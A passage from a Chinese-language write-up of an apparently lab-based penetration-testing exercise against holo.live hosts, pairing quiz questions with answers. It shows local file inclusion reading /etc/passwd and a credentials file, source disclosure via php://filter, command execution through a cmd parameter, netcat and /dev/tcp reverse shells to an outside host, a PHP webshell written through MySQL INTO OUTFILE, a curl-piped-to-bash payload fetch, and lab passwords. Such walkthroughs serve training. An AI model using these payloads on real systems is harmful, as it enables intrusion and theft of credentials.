+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://dev.holo.live/img.php?file=/etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br></code></pre></td></tr></table></figure>
+
+<p>查看admin.holo.live的robots.txt发现了如下目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://admin.holo.live/robots.txt<br>User-agent: *<br>Disallow: /var/www/admin/db.php<br>Disallow: /var/www/admin/dashboard.php<br>Disallow: /var/www/admin/supersecretdir/creds<br></code></pre></td></tr></table></figure>
+
+<p><strong>What file leaks the web server’s current directory?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">robots.txt<br></code></pre></td></tr></table></figure>
+
+<p><strong>What file loads images for the development domain?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">img.php<br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the full path of the credentials file on the administrator domain?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/www/admin/supersecretdir/creds.txt<br></code></pre></td></tr></table></figure>
+
+<p>问题说creds.txt包含管理员的凭证:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://admin.holo.live/supersecretdir/creds.txt<br>&lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;<br>&lt;html&gt;&lt;<span class="hljs-built_in">head</span>&gt;<br>&lt;title&gt;403 Forbidden&lt;/title&gt;<br>&lt;/head&gt;&lt;body&gt;<br>&lt;h1&gt;Forbidden&lt;/h1&gt;<br>&lt;p&gt;You don<span class="hljs-string">&#x27;t have permission to access this resource.&lt;/p&gt;</span><br><span class="hljs-string">&lt;hr&gt;</span><br><span class="hljs-string">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at admin.holo.live Port 80&lt;/address&gt;</span><br><span class="hljs-string">&lt;/body&gt;&lt;/html&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是直接访问会被告知没有权限，文件包含出来即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt<br>I know you forget things, so I<span class="hljs-string">&#x27;m leaving this note for you:</span><br><span class="hljs-string">admin:DBManagerLogin!</span><br><span class="hljs-string">- gurag </span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What file is vulnerable to LFI on the development domain?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">img.php<br></code></pre></td></tr></table></figure>
+
+<p><strong>What parameter in the file is vulnerable to LFI?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">file<br></code></pre></td></tr></table></figure>
+
+<p><strong>What file found from the information leak returns an HTTP error code 403 on the administrator domain?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/www/admin/supersecretdir/creds.txt<br></code></pre></td></tr></table></figure>
+
+<p><strong>Using LFI on the development domain read the above file. What are the credentials found from the file?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin:DBManagerLogin!<br></code></pre></td></tr></table></figure>
+
+<p>账号密码可以被用来登录admin.holo.live：</p>
+<p><img src="https://www.worldisend.com/img/image-20220705170518255.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705170518255"></p>
+<p>不过登录进去什么都没有。可以直接把该页面PHP脚本包含下来看源码中有没有什么参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://dev.holo.live/img.php?file=php://filter/convert.base64-encode/resource=/var/www/admin/dashboard.php  -o dashboard.php<br>$ <span class="hljs-built_in">cat</span> dashboard.php | <span class="hljs-built_in">base64</span> -d|grep GET<br>                  &lt;h4 class=<span class="hljs-string">&quot;card-title&quot;</span>&gt; &lt;?php <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] === NULL) &#123; <span class="hljs-built_in">echo</span> passthru(<span class="hljs-string">&quot;cat /tmp/Views.txt&quot;</span>); &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-built_in">echo</span> passthru(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&#125;?&gt; Visitors today&lt;/h4&gt;<br>                &lt;!--                   //if (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] === NULL) &#123; <span class="hljs-built_in">echo</span> passthru(<span class="hljs-string">&quot;cat /tmp/Views.txt&quot;</span>); &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-built_in">echo</span> passthru(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&#125; --&gt;<br></code></pre></td></tr></table></figure>
+
+<p>cmd参数似乎没有进行严格过滤。</p>
+<p><img src="https://www.worldisend.com/img/image-20220705171259290.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705171259290"></p>
+<p><strong>What file is vulnerable to RCE on the administrator domain?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dashboard.php<br></code></pre></td></tr></table></figure>
+
+<p><strong>What parameter is vulnerable to RCE on the administrator domain?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd<br></code></pre></td></tr></table></figure>
+
+<p><strong>What user is the web server running as?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data<br></code></pre></td></tr></table></figure>
+
+<p>反弹shell这里只有nc能成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://admin.holo.live/dashboard.php?cmd=nc%20-e%20%2Fbin%2Fbash%2010.50.109.110%201337<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.50.109.110] from (UNKNOWN) [10.200.112.33] 53154<br><br><span class="hljs-built_in">ls</span><br>action_page.php<br>assets<br>dashboard.php<br>db_connect.php<br>docs<br>examples<br>hololive.png<br>index.php<br>robots.txt<br>supersecretdir<br>script -qc /bin/bash /dev/null<br>www-data@f2820b9a2380:/var/www/admin$ ^Z<br>$ <span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>;<span class="hljs-built_in">fg</span>;<br>nc -lvnp 1337<br>             reset<br>reset: unknown terminal <span class="hljs-built_in">type</span> unknown<br>Terminal <span class="hljs-built_in">type</span>? screen<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@f2820b9a2380:/var/www/admin$ <span class="hljs-built_in">ls</span><br>action_page.php  dashboard.php	 docs	   hololive.png  robots.txt<br>assets		 db_connect.php  examples  index.php	 supersecretdir<br>www-data@f2820b9a2380:/var/www/admin$ <span class="hljs-built_in">cat</span> db_connect.php <br>&lt;?php<br><br>define(<span class="hljs-string">&#x27;DB_SRV&#x27;</span>, <span class="hljs-string">&#x27;192.168.100.1&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_PASSWD&#x27;</span>, <span class="hljs-string">&quot;!123SecureAdminDashboard321!&quot;</span>);<br>define(<span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;DashboardDB&#x27;</span>);<br><br><span class="hljs-variable">$connection</span> = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$connection</span> == <span class="hljs-literal">false</span>)&#123;<br><br>        die(<span class="hljs-string">&quot;Error: Connection to Database could not be made.&quot;</span> . mysqli_connect_error());<br>&#125;<br>?&gt;<br>www-data@f2820b9a2380:/var/www/admin$ <br></code></pre></td></tr></table></figure>
+
+<p>似乎在一个容器中，而当前目录下有一个数据库文件里包含了一个用户口令，而其链接的是192.168.100.1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@f2820b9a2380:/var/www/admin$ ifconfig<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.100.100  netmask 255.255.255.0  broadcast 192.168.100.255<br>        ether 02:42:c0:a8:64:64  txqueuelen 0  (Ethernet)<br>        RX packets 254373  bytes 18769104 (18.7 MB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 284635  bytes 462360915 (462.3 MB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        loop  txqueuelen 1000  (Local Loopback)<br>        RX packets 1820289  bytes 1084249745 (1.0 GB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 1820289  bytes 1084249745 (1.0 GB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>www-data@f2820b9a2380:/var/www/admin$ <br></code></pre></td></tr></table></figure>
+
+<p>在根目录还有一个docker环境变量文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@f2820b9a2380:/var/www/admin$ <span class="hljs-built_in">cd</span> /<br>www-data@f2820b9a2380:/$ <span class="hljs-built_in">ls</span><br>apache.tar  boot  etc	lib    media  opt   root  sbin	sys  usr<br>bin	    dev   home	lib64  mnt    proc  run   srv	tmp  var<br>www-data@f2820b9a2380:/$ <span class="hljs-built_in">ls</span> -all<br>total 340<br>drwxr-xr-x   1 root root   4096 Jul  5 07:16 .<br>drwxr-xr-x   1 root root   4096 Jul  5 07:16 ..<br>-rwxr-xr-x   1 root root      0 Jul  5 07:16 .dockerenv<br>-rw-r--r--   1 root root 266240 Jan  4  2021 apache.tar<br>www-data@f2820b9a2380:/$ <span class="hljs-built_in">cat</span> /proc/1/cgroup <br>12:blkio:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>11:hugetlb:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>10:rdma:/<br>9:net_cls,net_prio:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>8:freezer:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>7:pids:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>6:devices:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>5:cpuset:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>4:perf_event:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>3:cpu,cpuacct:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>2:memory:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>1:name=systemd:/docker/f2820b9a238030b0683c24aa200f151cce30d1529f9af3033e0193764636975c<br>0::/system.slice/containerd.service<br></code></pre></td></tr></table></figure>
+
+<p>那192.168.100.1应该是真实物理环境了：</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">www-data@f2820b9a2380:/var/www$ nc -zv 192.168.100.1 1<span class="hljs-string">-65535</span><br>ip<span class="hljs-string">-192</span><span class="hljs-string">-168</span><span class="hljs-string">-100</span><span class="hljs-string">-1</span>.eu-west<span class="hljs-string">-1</span>.compute.internal [192.168.100.1] 33060 (?) open<br>ip<span class="hljs-string">-192</span><span class="hljs-string">-168</span><span class="hljs-string">-100</span><span class="hljs-string">-1</span>.eu-west<span class="hljs-string">-1</span>.compute.internal [192.168.100.1] 8080 (http-alt) open<br>ip<span class="hljs-string">-192</span><span class="hljs-string">-168</span><span class="hljs-string">-100</span><span class="hljs-string">-1</span>.eu-west<span class="hljs-string">-1</span>.compute.internal [192.168.100.1] 3306 (mysql) open<br>ip<span class="hljs-string">-192</span><span class="hljs-string">-168</span><span class="hljs-string">-100</span><span class="hljs-string">-1</span>.eu-west<span class="hljs-string">-1</span>.compute.internal [192.168.100.1] 80 (http) open<br>ip<span class="hljs-string">-192</span><span class="hljs-string">-168</span><span class="hljs-string">-100</span><span class="hljs-string">-1</span>.eu-west<span class="hljs-string">-1</span>.compute.internal [192.168.100.1] 22 (ssh) open<br>www-data@f2820b9a2380:/var/www$ <br></code></pre></td></tr></table></figure>
+
+<p>可以看到还有一个8080端口和3306端口开放着。那么链接目标数据库看能否将webshell写入到8080解析目录然后反弹一个会话。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@f2820b9a2380:/var/www$ mysql -u admin -p -h 192.168.100.1    <br>Enter password: <br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 47<br>Server version: 8.0.22-0ubuntu0.20.04.2 (Ubuntu)<br><br>Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show grants <span class="hljs-keyword">for</span> admin;<br>+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+<br>| Grants <span class="hljs-keyword">for</span> admin@%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |<br>+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+<br>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER, CREATE TABLESPACE, CREATE ROLE, DROP ROLE ON *.* TO `admin`@`%`                                                                                                                                               |<br>| GRANT APPLICATION_PASSWORD_ADMIN,AUDIT_ADMIN,BACKUP_ADMIN,BINLOG_ADMIN,BINLOG_ENCRYPTION_ADMIN,CLONE_ADMIN,CONNECTION_ADMIN,ENCRYPTION_KEY_ADMIN,GROUP_REPLICATION_ADMIN,INNODB_REDO_LOG_ARCHIVE,INNODB_REDO_LOG_ENABLE,PERSIST_RO_VARIABLES_ADMIN,REPLICATION_APPLIER,REPLICATION_SLAVE_ADMIN,RESOURCE_GROUP_ADMIN,RESOURCE_GROUP_USER,ROLE_ADMIN,SERVICE_CONNECTION_ADMIN,SESSION_VARIABLES_ADMIN,SET_USER_ID,SHOW_ROUTINE,SYSTEM_USER,SYSTEM_VARIABLES_ADMIN,TABLE_ENCRYPTION_ADMIN,XA_RECOVER_ADMIN ON *.* TO `admin`@`%` |<br>| GRANT ALL PRIVILEGES ON `DashboardDB`.* TO `admin`@`%`                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |<br>+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br></code></pre></td></tr></table></figure>
+
+<p>有File权限。不过先看一眼库里边有什么吧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| DashboardDB        |<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| sys                |<br>+--------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; use DashboardDB;<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; show tables;<br>+-----------------------+<br>| Tables_in_DashboardDB |<br>+-----------------------+<br>| <span class="hljs-built_in">users</span>                 |<br>+-----------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br>mysql&gt; select * from <span class="hljs-built_in">users</span>;<br>+----------+-----------------+<br>| username | password        |<br>+----------+-----------------+<br>| admin    | DBManagerLogin! |<br>| gurag    | AAAA            |<br>+----------+-----------------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; select <span class="hljs-string">&#x27;&lt;?php $cmd=$_GET[&quot;cmd&quot;];system($cmd);?&gt;&#x27;</span> INTO OUTFILE <span class="hljs-string">&#x27;/var/www/html/sh.php&#x27;</span>;<br>mysql&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the Default Gateway for the Docker Container?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.100.1<br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the high web port open in the container gateway?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">8080<br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the low database port open in the container gateway?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">3306<br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the server address of the remote database?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.100.1<br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the password of the remote database?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">!123SecureAdminDashboard321!<br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the username of the remote database?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin<br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the database name of the remote database</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">DashboardDB<br></code></pre></td></tr></table></figure>
+
+<p><strong>What username can be found within the database itself?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gurag<br></code></pre></td></tr></table></figure>
+
+<h4 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h4><p>官方要求这样反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/10.50.109.110/1338 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo python -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">www</span>-data@f2820b9a2380:/var/www$ curl http://<span class="hljs-number">192.168.100.1:8080</span>/sh.php?cmd=curl%<span class="hljs-number">20</span>http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">10.50.109.110</span>%<span class="hljs-number">2</span>Fnc.sh%<span class="hljs-number">7</span>Cbash%<span class="hljs-number">20</span>%<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvnp 1338<br>listening on [any] 1338 ...<br>connect to [10.50.109.110] from (UNKNOWN) [10.200.112.33] 39508<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (2117): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@ip-10-200-112-33:/var/www/html$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/openssh/ssh-keysign<br>/usr/bin/umount<br>/usr/bin/docker<br>/usr/bin/fusermount<br>/usr/bin/newgrp<br>/usr/bin/pkexec<br>/usr/bin/su<br>/usr/bin/gpasswd<br>/usr/bin/passwd<br>/usr/bin/at<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/mount<br>/usr/bin/chsh<br>www-data@ip-10-200-112-33:/var/www/html$ wget http://10.50.109.110/CVE-2021-2043.py                    <br>--2022-07-05 09:54:00--  http://10.50.109.110/CVE-2021-2043.py<br>Connecting to 10.50.109.110:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: <span class="hljs-string">&#x27;CVE-2021-2043.py&#x27;</span><br><br>CVE-2021-2043.py    100%[===================&gt;]   3.37K  --.-KB/s   